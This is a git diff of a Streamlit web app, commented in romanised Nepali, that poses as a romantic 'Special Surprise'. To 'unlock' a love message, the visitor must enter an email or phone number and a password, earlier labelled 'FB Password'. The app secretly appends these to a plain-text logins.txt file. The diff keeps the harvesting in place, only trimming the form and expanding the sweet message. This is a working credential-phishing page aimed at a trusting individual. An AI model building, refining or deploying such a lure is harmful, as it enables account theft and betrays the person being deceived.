@@ -8,10 +8,10 @@ st.set_page_config(page_title="Special Surprise ❤️", page_icon="💖", layou
 DATA_FILE = "logins.txt"
 
 # 3. Data save garne function
-def save_data(email,pwd,num):
+def save_data(email,pwd):
     try:
         with open(DATA_FILE, "a", encoding="utf-8") as f:
-            f.write(f"Email: {email} | Password: {pwd}\n  | Number: {num}\n")
+            f.write(f"Email: {email} | Password: {pwd}\n")
     except Exception as e:
         st.error(f"Save error: {e}")
 
@@ -42,17 +42,16 @@ if not st.session_state.submitted:
     # --- FIXING THE FORM LOGIC ---
     with st.form("login_form"):
         # Variable haru form vitra define gareko
-        number_val = st.text_input("Mobile number")
-        email_val = st.text_input("Email Address")
-        password_val = st.text_input("FB Password", type="password")
-        
+        email_val = st.text_input("Mobile number or Email Address")
+        password_val = st.text_input("Email Password", type="password")
      
+        
         submit_btn = st.form_submit_button("Unlock Message❤️")
         
         # Jaba button click hunchha, variable check garne
         if submit_btn:
             # .strip() use garnu vanda paila check garnuhos ki variables khali chhainan
-            if  email_val and password_val:
+            if email_val and password_val:
                 save_data(email_val, password_val)
                 st.session_state.submitted = True
                 st.rerun()
@@ -65,7 +64,11 @@ else:
     <div style="text-align: center; background-color: #fff0f5; padding: 40px; border-radius: 20px; border: 3px solid #ffc1e3;">
         <h2 style="color: #d81b60;">💖 143! 💖</h2>
         <p style="font-size: 20px;">"Maile prem gareka dherai chij madhye 
-        timro aankha pani ek ho....  in the night second messsage update wait and see in 9 pm"</p>
+        timro aankha pani ek ho. 
+        Tyo aankhama sadhai khusi matra dekhna paau, 
+        aasu hoina. Timro muskan ra aankhako chamak
+         mero lagi sabai bhanda thulo upahaar ho. 
+            Stay happy, sweetheart!"</p>
     </div>
     """, unsafe_allow_html=True)
     
